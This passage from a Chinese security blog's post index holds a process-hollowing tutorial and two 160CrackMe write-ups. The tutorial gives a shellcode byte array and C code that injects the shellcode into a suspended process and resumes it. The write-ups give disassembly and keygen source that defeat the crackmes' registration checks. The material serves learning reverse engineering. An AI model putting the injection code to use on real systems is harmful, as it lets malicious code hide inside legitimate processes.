,0xF9 ,0x64 ,0x75 ,0x6E ,0xBA ,0x01 ,0x00 ,0x00 ,0x00 ,0x6B ,0xC2 ,0x0A ,0x8B ,0x4D ,0xFC ,0x0F ,0xBE ,0x14 ,0x01 ,0x83 ,0xFA ,0x72 ,0x75 ,0x5A ,0xB8 ,0x01 ,0x00 ,0x00 ,0x00 ,0x6B ,0xC8 ,0x0B ,0x8B ,0x55 ,0xFC ,0x0F ,0xBE ,0x04 ,0x0A ,0x83 ,0xF8 ,0x65 ,0x75 ,0x46 ,0xB9 ,0x01 ,0x00 ,0x00 ,0x00 ,0x6B ,0xD1 ,0x0C ,0x8B ,0x45 ,0xFC ,0x0F ,0xBE ,0x0C ,0x10 ,0x83 ,0xF9 ,0x73 ,0x75 ,0x32 ,0xBA ,0x01 ,0x00 ,0x00 ,0x00 ,0x6B ,0xC2 ,0x0D ,0x8B ,0x4D ,0xFC ,0x0F ,0xBE ,0x14 ,0x01 ,0x83 ,0xFA ,0x73 ,0x75 ,0x1E ,0x8B ,0x45 ,0xF4 ,0x8B ,0x4D ,0xDC ,0x0F ,0xB7 ,0x14 ,0x41 ,0x89 ,0x55 ,0xEC ,0x8B ,0x45 ,0xEC ,0x8B ,0x4D ,0xD8 ,0x8B ,0x55 ,0xF8 ,0x03 ,0x14 ,0x81 ,0x89 ,0x55 ,0xD4 ,0xEB ,0x05 ,0xE9 ,0x7E ,0xFE ,0xFF ,0xFF ,0x8B ,0x45 ,0xD4 ,0x8B ,0xE5 ,0x5D ,0xC3 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 &#125;;int main() &#123; if (ReplacProcess(&quot;C:\\\\Users\\\\Tophanter\\\\Desktop\\\\ConsoleApplication1.exe&quot;) == TRUE) &#123; printf(&quot;傀儡进程成功\\n&quot;); &#125; else &#123; printf(&quot;失败\\n&quot;); &#125; return 0;&#125;BOOL ReplacProcess(char* pszFilePath)&#123; STARTUPINFO si; PROCESS_INFORMATION pi; CONTEXT threadContext = &#123; 0 &#125;; RtlZeroMemory(&amp;si, sizeof(si)); RtlZeroMemory(&amp;pi, sizeof(pi)); RtlZeroMemory(&amp;threadContext, sizeof(threadContext)); si.cb = sizeof(STARTUPINFO); BOOL Flag = FALSE; //创建挂起的进程 Flag = CreateProcess(pszFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi); if (Flag == FALSE) &#123; printf(&quot;创建挂起进程失败\\n&quot;); return FALSE; &#125; //获取线程的上下文 threadContext.ContextFlags = CONTEXT_FULL; Flag = GetThreadContext(pi.hThread, &amp;threadContext); if (Flag == FALSE) &#123; printf(&quot;获取线程上下文失败\\n&quot;); return FALSE; &#125; // 拿到目标进程主线程上下文后，在Ebx寄存器中保存的就是PEB的地址， // 而PEB结构偏移0x8的位置是AddressOfImageBase字段， // 所以直接来读取ctx.Ebx+0x8，就可以获取到目标进程的加载基址 LPVOID lpBuffer = 0; Flag = ReadProcessMemory(pi.hProcess, (LPVOID)(threadContext.Ebx + 0x8), &amp;lpBuffer, 4, NULL); if (Flag == FALSE) &#123; printf(&quot;读取内存数据失败\\n&quot;); return FALSE; &#125; //写入shellcode Flag = WriteProcessMemory(pi.hProcess, (LPVOID)threadContext.Eax, data, sizeof(data), NULL); if (Flag == FALSE) &#123; printf(&quot;写入数据失败\\n&quot;); return FALSE; &#125; //恢复执行 ResumeThread(pi.hThread); return TRUE;&#125; 运行程序可以看到成功弹出shellcode 的内容。 使用任务管理器查看可以看到傀儡进程。 参考《Windows黑客编程技术详解》 创建傀儡进程代码","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ackie.cn/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ackie.cn/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"隐藏技术","slug":"隐藏技术","permalink":"https://b1ackie.cn/tags/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF/"}]},{"title":"160CrackMe-007","slug":"160CrackMe-007","date":"2021-08-03T02:52:32.000Z","updated":"2021-08-09T10:54:14.295Z","comments":true,"path":"2021/08/03/160CrackMe-007/","link":"","permalink":"https://b1ackie.cn/2021/08/03/160CrackMe-007/","excerpt":"","text":"初探打开程序还是和上一个有很熟悉的画面，不愧是同一个作者做的。 about按钮了解情况，还是需要让按钮消失然后露出logo就算成功了。 分析无壳，是使用delphi编写的。 还是直接使用DeDark查看，然后去下断 断下来之后进行分析，可以看到一个较为关键的跳转，在此之前的函数比较重要，进去查看一下。 进来之后果然看到了算法 12345678910111213141516171819202122232425262728293031323334353637383940004429EE |. 8945 F4 mov dword ptr ss:[ebp-0xC],eax004429F1 |. BE 01000000 mov esi,0x1004429F6 |&gt; 8B45 F8 /mov eax,dword ptr ss:[ebp-0x8]004429F9 |. E8 3610FCFF |call aLoNg3x_.00403A34004429FE |. 83F8 01 |cmp eax,0x100442A01 |. 7C 1D |jl short aLoNg3x_.00442A2000442A03 |&gt; 8B55 F8 |/mov edx,dword ptr ss:[ebp-0x8]00442A06 |. 0FB65432 FF ||movzx edx,byte ptr ds:[edx+esi-0x1]00442A0B |. 8B4D F8 ||mov ecx,dword ptr ss:[ebp-0x8]00442A0E |. 0FB64C01 FF ||movzx ecx,byte ptr ds:[ecx+eax-0x1]00442A13 |. 0FAFD1 ||imul edx,ecx00442A16 |. 0FAFD7 ||imul edx,edi00442A19 |. 03DA ||add ebx,edx00442A1B |. 48 ||dec eax00442A1C |. 85C0 ||test eax,eax00442A1E |.^ 75 E3 |\\jnz short aLoNg3x_.00442A0300442A20 |&gt; 46 |inc esi00442A21 |. FF4D F4 |dec dword ptr ss:[ebp-0xC]00442A24 |.^ 75 D0 \\jnz short aLoNg3x_.004429F600442A26 |&gt; 8BC3 mov eax,ebx00442A28 |. 99 cdq00442A29 |. 33C2 xor eax,edx00442A2B |. 2BC2 sub eax,edx00442A2D |. B9 2A2C0A00 mov ecx,0xA2C2A00442A32 |. 99 cdq00442A33 |. F7F9 idiv ecx00442A35 |. 8BDA mov ebx,edx00442A37 |. 8B45 FC mov eax,dword ptr ss:[ebp-0x4]00442A3A |. B9 59000000 mov ecx,0x5900442A3F |. 99 cdq00442A40 |. F7F9 idiv ecx00442A42 |. 8BC8 mov ecx,eax00442A44 |. 8B45 FC mov eax,dword ptr ss:[ebp-0x4]00442A47 |. BE 50000000 mov esi,0x5000442A4C |. 99 cdq00442A4D |. F7FE idiv esi00442A4F |. 03CA add ecx,edx00442A51 |. 41 inc ecx00442A52 |. 894D FC mov dword ptr ss:[ebp-0x4],ecx00442A55 |. 3B5D FC cmp ebx,dword ptr ss:[ebp-0x4] 但是问题是，其中edi的值一直为0，这导致一直在计算的值都是0，然后再进行比较，是不可以的，必须要找到edi在何处被赋值。 往上慢慢寻找一下，可以看到此处edi的值是通过eax赋值的，那么又要寻找eax的值，函数内部没有，需要出去函数寻找。 出函数之后，看到eax的值是通过一个地址传递的 继续找寻此地址的值是从何处得来，下硬件断点，没有断下来，说明不满足条件，不过在上面不远处就可以看到这个地址的赋值。看到如果想要进入此处需要让上面的JZ跳转不跳走，进入前面的函数看看 进去发现是一个判断你输入的codice中是否含有非数字的一个判断，但是其中又有一点限制，就是第一位如果输入-，+，$，X，x，剩下都是数字的话，也是可以的，反正就是，输入非纯数字的codice以便可以进入后面，如果输入第一位为以上几个的话，那么其中还需要至少再含有一个非数字就可以。 继续分析，再赋值前一条语句的函数就是关键的生成函数，进入分析，发现算法。 123456789101112131415161718192021222324252600442ACD |. B9 01000000 mov ecx,0x100442AD2 |&gt; 8B45 FC /mov eax,dword ptr ss:[ebp-0x4]00442AD5 |. 0FB60408 |movzx eax,byte ptr ds:[eax+ecx]00442AD9 |. BF 11000000 |mov edi,0x1100442ADE |. 33D2 |xor edx,edx00442AE0 |. F7F7 |div edi00442AE2 |. 42 |inc edx00442AE3 |. 8B45 FC |mov eax,dword ptr ss:[ebp-0x4]00442AE6 |. 0FB64408 FF |movzx eax,byte ptr ds:[eax+ecx-0x1]00442AEB |. 0FAFD0 |imul edx,eax00442AEE |. 03F2 |add esi,edx00442AF0 |. 41 |inc ecx ; user32.75B16D5100442AF1 |. 4B |dec ebx00442AF2 |.^ 75 DE \\jnz short aLoNg3x_.00442AD200442AF4 |. EB 02 jmp short aLoNg3x_.00442AF800442AF6 |&gt; 33F6 xor esi,esi00442AF8 |&gt; 8BC6 mov eax,esi00442AFA |. B9 48710000 mov ecx,0x714800442AFF |. 99 cdq00442B00 |. F7F9 idiv ecx ; user32.75B16D5100442B02 |. 8BC2 mov eax,edx00442B04 |. 99 cdq00442B05 |. 33C2 xor eax,edx ; XOR000442B07 |. 2BC2 sub eax,edx ; -000442B09 |. 8BD8 mov ebx,eax00442B0B |. 33C0 xor eax,eax 这里会生成一个标志值，用于后面的计算 123456789int len = strlen(szCodice);int remainder;int sum = 0x37B;for (int i = 1; i &lt; len ; i++) &#123; remainder = szCodice[i] % 0x11 + 1; sum += remainder * szCodice[i - 1];&#125;sum = sum % 0x7148;return sum; 生成标志值之后就可以继续刚才的算法计算了， 12345678910111213141516171819202122232425int len = strlen(szName);int sum = 0;for (int i = 0; i &lt;= len; i++) &#123; for (int j = 0; j &lt;= len; j++) &#123; sum += (szName[i] * szName[len - j]) * FlagNumber; &#125;&#125;__asm &#123; mov eax,sum cdq xor eax,edx sub eax,edx mov ecx,0xA2C2A cdq idiv ecx mov ebx,edx mov sum,ebx&#125;int serial;for (int i = 1; i &lt; 0xFFFFFFFF; i++) &#123; if (((i / 0x59) + (i % 0x50) + 1) == sum) &#123; printf(&quot;codice:%d\\n&quot;, i); break; &#125;&#125; 到这里算出了一个可以用的codice 输入后发现又出现了一个again按钮。 从dedark中找到againClick事件，经过分析发现其实是和OK按钮一模一样的流程，也就是把刚才输入的在输入一次就好了 注册机完整注册机如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;Windows.h&gt;//字母int getFlagNumber(char* szCodice) &#123; int len = strlen(szCodice); int remainder; int sum = 0x37B; for (int i = 1; i &lt; len ; i++) &#123; remainder = szCodice[i] % 0x11 + 1; sum += remainder * szCodice[i - 1]; &#125; sum = sum % 0x7148; return sum;&#125;void OkClick(char* szName,int FlagNumber) &#123; int len = strlen(szName); int sum = 0; for (int i = 0; i &lt;= len; i++) &#123; for (int j = 0; j &lt;= len; j++) &#123; sum += (szName[i] * szName[len - j]) * FlagNumber; &#125; &#125; __asm &#123; mov eax,sum cdq xor eax,edx sub eax,edx mov ecx,0xA2C2A cdq idiv ecx mov ebx,edx mov sum,ebx &#125; int serial; for (int i = 1; i &lt; 0xFFFFFFFF; i++) &#123; if (((i / 0x59) + (i % 0x50) + 1) == sum) &#123; printf(&quot;codice:%d\\n&quot;, i); break; &#125; &#125;&#125;int main() &#123; printf(&quot;请先输入第一位是字母的Codice以便生成标志值\\n&quot;); char Codice[20]; gets_s(Codice, 20); int FlagNumber = getFlagNumber(Codice); printf(&quot;输入用户名\\n&quot;); char name[20]; gets_s(name, 20); OkClick(name, FlagNumber); return 0;&#125; 总结这个程序就是需要先输入非纯数字codice生成一个标志值计算，然后再输入codice就可以了，连续两次即可。注册机那段内联汇编，实在不知道怎么用C写了…","categories":[{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ackie.cn/categories/CrackMe/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ackie.cn/tags/CrackMe/"}]},{"title":"160CrackMe-006","slug":"160CrackMe-006","date":"2021-08-02T10:19:24.000Z","updated":"2021-08-09T10:54:13.024Z","comments":true,"path":"2021/08/02/160CrackMe-006/","link":"","permalink":"https://b1ackie.cn/2021/08/02/160CrackMe-006/","excerpt":"","text":"初探打开程序如下看到OK是不可点击的，是一个灰色按钮。 点击about查看一下，可以看到我们需要让两个按钮都消失以便可以看到Ringzer0的logo 那么先想办法让OK变得可以点击吧。 分析查看壳，发现未加壳，是用Delphi写的 使用API断点，给IsEnableWindow下断，但是发现怎么都无法断下来，说明肯定是有条件的，而当前还没有满足这个条件。 使用dedark工具帮忙查看，直接分析真的是太难找了，可以看到主要四个事件，这四个事件应该比较关键 根据函数地址找到函数下好断点之后，查看可以发现nomechange和codicechange几乎是一样的，将两处明显的跳转更改条件使跳转失效，让程序跑起来后都会断在之前下的API断点上。那么它们都是比较关键的地方。 第一个关键跳转都是判断eax+0x47这个地址的值是否等于0，而第二个跳转都是先调用了00442A3C这个函数。 nomechange： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596000442E04 /. 55 push ebp ; nomeChange00442E05 |. 8BEC mov ebp,esp00442E07 |. 6A 00 push 0x000442E09 |. 6A 00 push 0x000442E0B |. 53 push ebx00442E0C |. 8BD8 mov ebx,eax00442E0E |. 33C0 xor eax,eax00442E10 |. 55 push ebp00442E11 |. 68 9B2E4400 push aLoNg3x_.00442E9B00442E16 |. 64:FF30 push dword ptr fs:[eax]00442E19 |. 64:8920 mov dword ptr fs:[eax],esp00442E1C |. 8B83 D0020000 mov eax,dword ptr ds:[ebx+0x2D0]00442E22 |. 8078 47 00 cmp byte ptr ds:[eax+0x47],0x000442E26 |. 75 0F jnz short aLoNg3x_.00442E37 ; 关键跳转100442E28 |. B2 01 mov dl,0x100442E2A |. 8B83 CC020000 mov eax,dword ptr ds:[ebx+0x2CC]00442E30 |. 8B08 mov ecx,dword ptr ds:[eax] ; aLoNg3x_.0044282C00442E32 |. FF51 60 call dword ptr ds:[ecx+0x60] ; IsEnableWindow00442E35 |. EB 49 jmp short aLoNg3x_.00442E8000442E37 |&gt; 8D55 FC lea edx,dword ptr ss:[ebp-0x4]00442E3A |. 8B83 E0020000 mov eax,dword ptr ds:[ebx+0x2E0]00442E40 |. E8 7B04FEFF call aLoNg3x_.004232C000442E45 |. 8B45 FC mov eax,dword ptr ss:[ebp-0x4] ; user32.75B1727600442E48 |. 50 push eax00442E49 |. 8D55 F8 lea edx,dword ptr ss:[ebp-0x8]00442E4C |. 8B83 DC020000 mov eax,dword ptr ds:[ebx+0x2DC] ; comctl_1.7464695700442E52 |. E8 6904FEFF call aLoNg3x_.004232C000442E57 |. 8B45 F8 mov eax,dword ptr ss:[ebp-0x8]00442E5A |. 5A pop edx ; aLoNg3x_.0041E13E00442E5B |. E8 DCFBFFFF call aLoNg3x_.00442A3C00442E60 |. 84C0 test al,al00442E62 |. 74 0F je short aLoNg3x_.00442E73 ; 关键跳转200442E64 |. B2 01 mov dl,0x100442E66 |. 8B83 CC020000 mov eax,dword ptr ds:[ebx+0x2CC]00442E6C |. 8B08 mov ecx,dword ptr ds:[eax] ; aLoNg3x_.0044282C00442E6E |. FF51 60 call dword ptr ds:[ecx+0x60] ; IsEnableWindow00442E71 |. EB 0D jmp short aLoNg3x_.00442E8000442E73 |&gt; 33D2 xor edx,edx00442E75 |. 8B83 CC020000 mov eax,dword ptr ds:[ebx+0x2CC]00442E7B |. 8B08 mov ecx,dword ptr ds:[eax] ; aLoNg3x_.0044282C00442E7D |. FF51 60 call dword ptr ds:[ecx+0x60]00442E80 |&gt; 33C0 xor eax,eax00442E82 |. 5A pop edx ; aLoNg3x_.0041E13E00442E83 |. 59 pop ecx ; aLoNg3x_.0041E13E00442E84 |. 59 pop ecx ; aLoNg3x_.0041E13E00442E85 |. 64:8910 mov dword ptr fs:[eax],edx00442E88 |. 68 A22E4400 push aLoNg3x_.00442EA200442E8D |&gt; 8D45 F8 lea eax,dword ptr ss:[ebp-0x8]00442E90 |. BA 02000000 mov edx,0x200442E95 |. E8 4209FCFF call aLoNg3x_.004037DC00442E9A \\. C3 retn00442E9B .^ E9 D803FCFF jmp aLoNg3x_.0040327800442EA0 .^ EB EB jmp short aLoNg3x_.00442E8D00442EA2 . 5B pop ebx ; aLoNg3x_.0041E13E00442EA3 . 59 pop ecx ; aLoNg3x_.0041E13E00442EA4 . 59 pop ecx ; aLoNg3x_.0041E13E00442EA5 . 5D pop ebp ; aLoNg3x_.0041E13E00442EA6 . C3 retn codicechange： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727300442C78 /. 55 push ebp ; codiceChange00442C79 |. 8BEC mov ebp,esp00442C7B |. 33C9 xor ecx,ecx00442C7D |. 51 push ecx00442C7E |. 51 push ecx00442C7F |. 51 push ecx00442C80 |. 51 push ecx00442C81 |. 53 push ebx00442C82 |. 56 push esi00442C83 |. 8BD8 mov ebx,eax00442C85 |. 33C0 xor eax,eax00442C87 |. 55 push ebp00442C88 |. 68 562D4400 push aLoNg3x_.00442D5600442C8D |. 64:FF30 push dword ptr fs:[eax]00442C90 |. 64:8920 mov dword ptr fs:[eax],esp00442C93 |. 8D55 F8 lea edx,dword ptr ss:[ebp-0x8]00442C96 |. 8B83 E0020000 mov eax,dword ptr ds:[ebx+0x2E0]00442C9C |. E8 1F06FEFF call aLoNg3x_.004232C000442CA1 |. 8B45 F8 mov eax,dword ptr ss:[ebp-0x8]00442CA4 |. 8D55 FC lea edx,dword ptr ss:[ebp-0x4]00442CA7 |. E8 ACFCFBFF call aLoNg3x_.0040295800442CAC |. 8BF0 mov esi,eax00442CAE |. 837D FC 00 cmp dword ptr ss:[ebp-0x4],0x000442CB2 |. 74 18 je short aLoNg3x_.00442CCC00442CB4 |. 8D55 F4 lea edx,dword ptr ss:[ebp-0xC]00442CB7 |. 8BC6 mov eax,esi00442CB9 |. E8 8249FCFF call aLoNg3x_.0040764000442CBE |. 8B55 F4 mov edx,dword ptr ss:[ebp-0xC]00442CC1 |. 8B83 E0020000 mov eax,dword ptr ds:[ebx+0x2E0]00442CC7 |. E8 2406FEFF call aLoNg3x_.004232F000442CCC |&gt; 8B83 D0020000 mov eax,dword ptr ds:[ebx+0x2D0]00442CD2 |. 8078 47 00 cmp byte ptr ds:[eax+0x47],0x000442CD6 |. 75 0F jnz short aLoNg3x_.00442CE7 ; 关键跳转100442CD8 |. B2 01 mov dl,0x100442CDA |. 8B83 CC020000 mov eax,dword ptr ds:[ebx+0x2CC] ; comctl_1.7464695700442CE0 |. 8B08 mov ecx,dword ptr ds:[eax] ; aLoNg3x_.0044282C00442CE2 |. FF51 60 call dword ptr ds:[ecx+0x60] ; IsEnableWindow00442CE5 |. EB 49 jmp short aLoNg3x_.00442D3000442CE7 |&gt; 8D55 F8 lea edx,dword ptr ss:[ebp-0x8]00442CEA |. 8B83 E0020000 mov eax,dword ptr ds:[ebx+0x2E0]00442CF0 |. E8 CB05FEFF call aLoNg3x_.004232C000442CF5 |. 8B45 F8 mov eax,dword ptr ss:[ebp-0x8]00442CF8 |. 50 push eax00442CF9 |. 8D55 F0 lea edx,dword ptr ss:[ebp-0x10]00442CFC |. 8B83 DC020000 mov eax,dword ptr ds:[ebx+0x2DC]00442D02 |. E8 B905FEFF call aLoNg3x_.004232C000442D07 |. 8B45 F0 mov eax,dword ptr ss:[ebp-0x10]00442D0A |. 5A pop edx ; aLoNg3x_.0041E13E00442D0B |. E8 2CFDFFFF call aLoNg3x_.00442A3C00442D10 |. 84C0 test al,al00442D12 |. 74 0F je short aLoNg3x_.00442D23 ; 关键跳转200442D14 |. B2 01 mov dl,0x100442D16 |. 8B83 CC020000 mov eax,dword ptr ds:[ebx+0x2CC] ; comctl_1.7464695700442D1C |. 8B08 mov ecx,dword ptr ds:[eax] ; aLoNg3x_.0044282C00442D1E |. FF51 60 call dword ptr ds:[ecx+0x60] ; IsEnableWindow00442D21 |. EB 0D jmp short aLoNg3x_.00442D3000442D23 |&gt; 33D2 xor edx,edx00442D25 |. 8B83 CC020000 mov eax,dword ptr ds:[ebx+0x2CC] ; comctl_1.7464695700442D2B |. 8B08 mov ecx,dword ptr ds:[eax] ; aLoNg3x_.0044282C00442D2D |. FF51 60 call dword ptr ds:[ecx+0x60]00442D30 |&gt; 33C0 xor eax,eax00442D32 |. 5A pop edx ; aLoNg3x_.0041E13E00442D33 |. 59 pop ecx ; aLoNg3x_.0041E13E00442D34 |. 59 pop ecx ; aLoNg3x_.0041E13E00442D35 |. 64:8910 mov dword ptr fs:[eax],edx00442D38 |. 68 5D2D4400 push aLoNg3x_.00442D5D00442D3D |&gt; 8D45 F0 lea eax,dword ptr ss:[ebp-0x10]00442D40 |. E8 730AFCFF call aLoNg3x_.004037B800442D45 |. 8D45 F4 lea eax,dword ptr ss:[ebp-0xC]00442D48 |. E8 6B0AFCFF call aLoNg3x_.004037B800442D4D |. 8D45 F8 lea eax,dword ptr ss:[ebp-0x8]00442D50 |. E8 630AFCFF call aLoNg3x_.004037B800442D55 \\. C3 retn 尝试在eax+0x47这下硬件写入断点，发现并不能断下来，说明还是没有满足某个条件。 看第二个关键函数，可以看到一个计算，通过用户名算出serial，懒得再解释了QAQ，直接看下面代码吧。 1234567891011121314151600442A8E |. B8 01000000 mov eax,0x100442A93 |&gt; 8B4D FC /mov ecx,dword ptr ss:[ebp-0x4] ; user32.75B1727600442A96 |. 0FB64C01 FF |movzx ecx,byte ptr ds:[ecx+eax-0x1]00442A9B |. 8B75 FC |mov esi,dword ptr ss:[ebp-0x4] ; user32.75B1727600442A9E |. 0FB63406 |movzx esi,byte ptr ds:[esi+eax]00442AA2 |. 0FAFCE |imul ecx,esi00442AA5 |. 0FAFC8 |imul ecx,eax00442AA8 |. 03D9 |add ebx,ecx00442AAA |. 40 |inc eax00442AAB |. 4A |dec edx00442AAC |.^ 75 E5 \\jnz short aLoNg3x_.00442A9300442AAE |&gt; 8B45 F8 mov eax,dword ptr ss:[ebp-0x8]00442AB1 |. E8 BA4BFCFF call aLoNg3x_.0040767000442AB6 |. 2BD8 sub ebx,eax00442AB8 |. 81FB 9A020000 cmp ebx,0x29A00442ABE |. 75 04 jnz short aLoNg3x_.00442AC4 12345678910int len = strlen(szname);int sum = len;int temp = 1;for (int i = 0; i &lt; len - 1; i++) &#123; sum = ((szname[i] * szname[i + 1]) * temp) + sum; temp++;&#125;int serial;serial = sum - 0x29A;printf(&quot;%d\\n&quot;, serial); 输入发现OK按钮已经亮了 点击OK按钮发现，没有用，codice清0，然后OK又灰色了。 从OK按钮入手，发现刚进来的第一个跳转就是熟悉的判断条件，说明程序并不是直接点击OK的，在这之前肯定还有一个条件要满足的。先继续在这里看一下，修改这个条件往下走，可以看到第二个跳转，修改这个跳转，按钮就会小时，经过分析之前这个函数就是算法。 1234567891011121314151617181920212223242526272829303132333435363738394041424300442D64 /. 55 push ebp00442D65 |. 8BEC mov ebp,esp00442D67 |. 6A 00 push 0x000442D69 |. 53 push ebx00442D6A |. 8BD8 mov ebx,eax00442D6C |. 33C0 xor eax,eax00442D6E |. 55 push ebp00442D6F |. 68 ED2D4400 push aLoNg3x_.00442DED00442D74 |. 64:FF30 push dword ptr fs:[eax]00442D77 |. 64:8920 mov dword ptr fs:[eax],esp00442D7A |. 8B83 D0020000 mov eax,dword ptr ds:[ebx+0x2D0]00442D80 |. 8078 47 01 cmp byte ptr ds:[eax+0x47],0x1 ; 熟悉的地址00442D84 |. 75 12 jnz short aLoNg3x_.00442D9800442D86 |. BA 002E4400 mov edx,aLoNg3x_.00442E00 ; UNICODE &quot;0&quot;00442D8B |. 8B83 E0020000 mov eax,dword ptr ds:[ebx+0x2E0]00442D91 |. E8 5A05FEFF call aLoNg3x_.004232F000442D96 |. EB 3F jmp short aLoNg3x_.00442DD700442D98 |&gt; 8D55 FC lea edx,dword ptr ss:[ebp-0x4]00442D9B |. 8B83 E0020000 mov eax,dword ptr ds:[ebx+0x2E0]00442DA1 |. E8 1A05FEFF call aLoNg3x_.004232C000442DA6 |. 8B45 FC mov eax,dword ptr ss:[ebp-0x4]00442DA9 |. E8 C248FCFF call aLoNg3x_.0040767000442DAE |. 50 push eax00442DAF |. 8D55 FC lea edx,dword ptr ss:[ebp-0x4]00442DB2 |. 8B83 DC020000 mov eax,dword ptr ds:[ebx+0x2DC]00442DB8 |. E8 0305FEFF call aLoNg3x_.004232C000442DBD |. 8B45 FC mov eax,dword ptr ss:[ebp-0x4]00442DC0 |. 5A pop edx ; 0018F8D400442DC1 |. E8 DAFDFFFF call aLoNg3x_.00442BA0 ; 算法00442DC6 |. 84C0 test al,al00442DC8 |. 74 0D je short aLoNg3x_.00442DD700442DCA |. 33D2 xor edx,edx00442DCC |. 8B83 CC020000 mov eax,dword ptr ds:[ebx+0x2CC]00442DD2 |. E8 D903FEFF call aLoNg3x_.004231B000442DD7 |&gt; 33C0 xor eax,eax00442DD9 |. 5A pop edx ; 0018F8D400442DDA |. 59 pop ecx ; 0018F8D400442DDB |. 59 pop ecx ; 0018F8D400442DDC |. 64:8910 mov dword ptr fs:[eax],edx00442DDF |. 68 F42D4400 push aLoNg3x_.00442DF400442DE4 |&gt; 8D45 FC lea eax,dword ptr ss:[ebp-0x4]00442DE7 |. E8 CC09FCFF call aLoNg3x_.004037B800442DEC \\. C3 retn 进入算法进行查看，可以看到一个通过注册码求用户名的过程。 123456789101112131415161700442C09 |. 0FB64430 FF |movzx eax,byte ptr ds:[eax+esi-0x1] ; 获取最后一位00442C0E |. F7E8 |imul eax ; 平方00442C10 |. 0FBFC0 |movsx eax,ax00442C13 |. F7EE |imul esi ; 乘以长度/长度不断-100442C15 |. B9 19000000 |mov ecx,0x1900442C1A |. 99 |cdq00442C1B |. F7F9 |idiv ecx00442C1D |. 83C2 41 |add edx,0x41 ; 除以0x19余数+0x4100442C20 |. 58 |pop eax ; 0018F8D400442C21 |. 8810 |mov byte ptr ds:[eax],dl00442C23 |. 4E |dec esi00442C24 |. 85F6 |test esi,esi00442C26 |.^ 75 D1 \\jnz short aLoNg3x_.00442BF900442C28 |&gt; 8B45 F4 mov eax,dword ptr ss:[ebp-0xC]00442C2B |. 8B55 FC mov edx,dword ptr ss:[ebp-0x4]00442C2E |. E8 110FFCFF call aLoNg3x_.00403B44 ; 与输入的用户名进行比较00442C33 |. 75 17 jnz short aLoNg3x_.00442C4C 代码如下： 12345678910111213char name[20];itoa(serial, name,10);int len = strlen(name);int a = len;for (int i = 0; i &lt; len; i++) &#123; int temp = name[a-1] * name[a-1]; temp = temp * a; temp = temp % 0x19; temp = temp + 0x41; name[a - 1] = temp; a = a - 1;&#125;printf(&quot;%s\\n&quot;, name); 现在就剩下最后一个事件，CancellaClick 进去查看，发现里面没有那个熟悉的地址，那么基本上那个地址的赋值应该就是在这里了吧，只有一个跳转，修改条件后，最早下的硬件断点终于断下来了。那么查看一下算法的过程。 进入函数查看，可以看到具体的算法，是一个通过用户名求注册码的过程。 1234567891011121314151617181920212223242526272829303100442B20 |. 83F8 05 cmp eax,0x5 ; 判断输入的name是否大于500442B23 |. 7E 53 jle short aLoNg3x_.00442B7800442B25 |. 8B45 FC mov eax,dword ptr ss:[ebp-0x4]00442B28 |. 0FB640 04 movzx eax,byte ptr ds:[eax+0x4] ; 获取name第五位00442B2C |. B9 07000000 mov ecx,0x700442B31 |. 33D2 xor edx,edx00442B33 |. F7F1 div ecx ; 除以700442B35 |. 8BC2 mov eax,edx ; 余数00442B37 |. 83C0 02 add eax,0x200442B3A |. E8 E1FEFFFF call aLoNg3x_.00442A20 ; 阶乘00442B3F |. 8BF0 mov esi,eax00442B41 |. 33DB xor ebx,ebx00442B43 |. 8B45 FC mov eax,dword ptr ss:[ebp-0x4]00442B46 |. E8 E90EFCFF call aLoNg3x_.00403A3400442B4B |. 85C0 test eax,eax00442B4D |. 7E 16 jle short aLoNg3x_.00442B6500442B4F |. BA 01000000 mov edx,0x100442B54 |&gt; 8B4D FC /mov ecx,dword ptr ss:[ebp-0x4]00442B57 |. 0FB64C11 FF |movzx ecx,byte ptr ds:[ecx+edx-0x1] ; 逐位获取00442B5C |. 0FAFCE |imul ecx,esi00442B5F |. 03D9 |add ebx,ecx ; user32.75B16D5100442B61 |. 42 |inc edx00442B62 |. 48 |dec eax00442B63 |.^ 75 EF \\jnz short aLoNg3x_.00442B5400442B65 |&gt; 2B5D F8 sub ebx,dword ptr ss:[ebp-0x8] ; 减去注册码十六进制00442B68 |. 81FB 697A0000 cmp ebx,0x7A6900442B6E |. 75 04 jnz short aLoNg3x_.00442B7400442B70 |. B3 01 mov bl,0x1 ; 关键的赋值00442B72 |. EB 06 jmp short aLoNg3x_.00442B7A00442B74 |&gt; 33DB xor ebx,ebx00442B76 |. EB 02 jmp short aLoNg3x_.00442B7A 代码如下： 123456789101112131415int a = szname[4] % 0x7;a = a + 2;int num = 1;for (int i = 1; i &lt;= a; i++) &#123; num = num * i;&#125;int len = strlen(szname);int sum = 0;for (int i = 0; i &lt; len; i++) &#123; sum += szname[i] * num;&#125;int serial;serial = sum - 0x7A69;printf(&quot;%d\\n&quot;, serial);return serial; 当经过了这个判断之后，那个地址就会被赋值，同时cancle按钮也会消失，ok按钮会常亮。 那么整体的流程就很清楚，首先要通过用户名计算一个注册码输入cancle按钮消失，ok变亮，然后再通过注册码计算出一个用户名输入后，ok消失，完成注册 注册机编写完整注册机代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;#include &lt;string.h&gt;int CancleClick(char* szname) &#123; int a = szname[4] % 0x7; a = a + 2; int num = 1; for (int i = 1; i &lt;= a; i++) &#123; num = num * i; &#125; int len = strlen(szname); int sum = 